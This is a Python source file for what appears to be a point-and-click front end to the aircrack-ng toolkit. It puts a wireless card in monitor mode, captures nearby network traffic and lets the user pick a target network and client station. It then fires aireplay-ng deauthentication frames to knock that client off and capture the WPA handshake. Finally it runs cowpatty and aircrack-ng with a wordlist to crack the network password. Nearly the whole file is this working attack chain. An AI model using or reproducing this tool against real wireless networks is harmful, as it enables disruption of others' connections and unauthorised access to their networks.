import subprocess
import tobleroneCsvRead as tcr
import tkinter as tk
from tkinter import filedialog

#read config file
conf = open("configs/dump.conf", "r")
confRead = conf.read()
##########################################

#pop up htop
def htop():
    p = subprocess.Popen(['xterm', '-e', 'htop'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
######################################################################################################################

def ifConfig():
    p = subprocess.Popen(['xterm', '-hold','-e', 'iwconfig'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
#####################################################################################################################################

#to edit config
def editConfig():
    p = subprocess.Popen(['xterm', '-e', 'nano', 'configs/dump.conf'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
######################################################################################################################


#put card to moniter mode
def toMoniter():
    down = subprocess.Popen(['xterm', '-e', 'ifconfig', confRead.strip(), 'down'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)  
    modeMoniter = subprocess.Popen(['xterm', '-e', 'iwconfig', confRead.strip(), 'mode', 'moniter'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    up = subprocess.Popen(['xterm', '-e', 'ifconfig', confRead.strip(), 'up'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)   
    ifPacketInjection = subprocess.Popen(['xterm','-e', 'aireplay-ng', '--test', confRead.strip()], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
######################################################################################################################


#put card in managed mode
def toManaged():
    down = subprocess.Popen(['xterm', '-e', 'ifconfig', confRead.strip(), 'down'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)  
    modeMoniter = subprocess.Popen(['xterm', '-e', 'iwconfig', confRead.strip(), 'mode', 'managed'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    up = subprocess.Popen(['xterm', '-e', 'ifconfig', confRead.strip(), 'up'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)   
######################################################################################################################

#to scan all networks
def groupDumpStart():
    p = subprocess.Popen(['xterm', '-e', 'airodump-ng','-w', 'traffic/groupCapture', confRead.strip()], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
########################################################################################################################



#targeted scan with file picker dialog
def targetedAiroDumpStart():
    #airodump-ng -c 11 --bssid 00:01:02:03:04:05 -w dump wlan0mon
    filepath = filedialog.askopenfilename(initialdir='./traffic', title='Pick CSV file', filetypes=(('csv', '*.csv'),('All files', '*.*')))
    readCsv = tcr.readCsv(filepath)
    path = open('configs/targetPath.conf', 'w+')
    path.write(filepath)

    class listDialog(tk.Tk):
        def __init__(self):
            super().__init__()
            

            self.ssidList = tk.Listbox(self)
            self.ssidList.insert(0, *readCsv[13])

            self.bssidList = tk.Listbox(self)
            self.bssidList.insert(0, *readCsv[0])

            self.channelList = tk.Listbox(self)
            self.channelList.insert(0, *readCsv[3])
            
            self.print_btn = tk.Button(self, text='Select target', command=self.print_selected)
            self.lbl = tk.Label(self, text='Choose a target').pack()
            self.ssidList.pack()
            self.print_btn.pack(fill=tk.BOTH)

        def print_selected(self): 
            target = open('configs/targetData.conf', 'w+')   
            selection = self.ssidList.curselection()
            for i in selection:
                target.writelines(self.ssidList.get(i).strip() + ',')
                target.writelines(self.bssidList.get(i).strip() + ',')
                target.writelines(self.channelList.get(i).strip())
                listDialog.destroy(self)    
                
    
    listDialog()

def targetedAiroDumpStart1():

    targetList = []
    print("Reading..........\n")
    with open('configs/targetData.conf', 'r') as f:
        targetList = f.read().split(',')

    print(targetList)
    
    p = subprocess.Popen(['xterm', '-e', 'airodump-ng', '-c', targetList[2].strip(), '--bssid', targetList[1].strip(), '-w', 'traffic/targetCapture', confRead.strip()], stdin=subprocess.PIPE, stdout=subprocess.PIPE) 
################################################################################################################################################################################################################################################

def stationSelect():
    filepath = filedialog.askopenfilename(initialdir='./traffic', title='Pick CSV file', filetypes=(('csv', '*.csv'),('All files', '*.*')))
    readCsv = tcr.readCsv(filepath)
    path = open('configs/targetPath.conf', 'w+')
    path.write(filepath)
    #print(readCsv[0][3])
    statList = [] 
    read = False
    for ele in readCsv[0]:
        if ele == "Station MAC" or read == True:
            read = True
            statList.append(ele)


    class listDialog(tk.Tk):
        def __init__(self):
            super().__init__()
            

            self.statList = tk.Listbox(self)
            self.statList.insert(0, *statList)

            #self.powerList = tk.Listbox(self)
            #self.powerList.insert(0, *readCsv[8])
            
            self.print_btn = tk.Button(self, text='Select Station', command=self.print_selected)

            self.statList.grid(row=0, column=0)
            #self.powerList.grid(row=0, column=1)
            self.print_btn.grid(row=1, column=0)

        def print_selected(self): 
            target = open('configs/statData.conf', 'w+')   
            selection = self.statList.curselection()
            #print([self.ssidList.get(i) + self.bssidList.get(i) for i in selection])    
            for i in selection:
                print(self.statList.get(i).strip())
                #print(self.powerList.get(i).strip())

                target.writelines(self.statList.get(i).strip())
                listDialog.destroy(self)
                
    
    listDialog()

#################################################################################################################################    

def deauth():

    targetList = []
    print("Reading..........\n")

    with open('configs/targetData.conf', 'r') as f:
        targetList = f.read().split(',')

    with open('configs/statData.conf') as s:
        targetList.append(s.read())

    timesAtk = '16'

    #print(targetList)

    p = subprocess.Popen(['xterm', '-e', 'aireplay-ng', '--deauth', timesAtk.strip(), '-a', targetList[1].strip(), '-c', targetList[3], confRead.strip()], stdin=subprocess.PIPE, stdout=subprocess.PIPE)    
#########################################################################################################################################################################################################


def checkForHandshake():
    filepath = filedialog.askopenfilename(initialdir='./traffic', title='Pick Cap file', filetypes=(('cap', '*.cap'),('All files', '*.*')))
    p = subprocess.Popen(['xterm', '-hold', '-e', 'cowpatty', '-r', filepath.strip(), '-c'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
###################################################################################################################################################################    
    

def useAireC():
    #aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap
    filepath = filedialog.askopenfilename(initialdir='./traffic', title='Pick Cap file', filetypes=(('cap', '*.cap'),('All files', '*.*')))
    filepath1 = filedialog.askopenfilename(initialdir='./wordList', title='Pick wordlist', filetypes=(('txt', '*.txt'),('All files', '*.*')))
    #target = tcr.readCsv('configs/targetData.conf')
    p = subprocess.Popen(['xterm', '-hold', '-e','aircrack-ng', '-w',filepath1.strip(), filepath.strip()], stdin=subprocess.PIPE, stdout=subprocess.PIPE)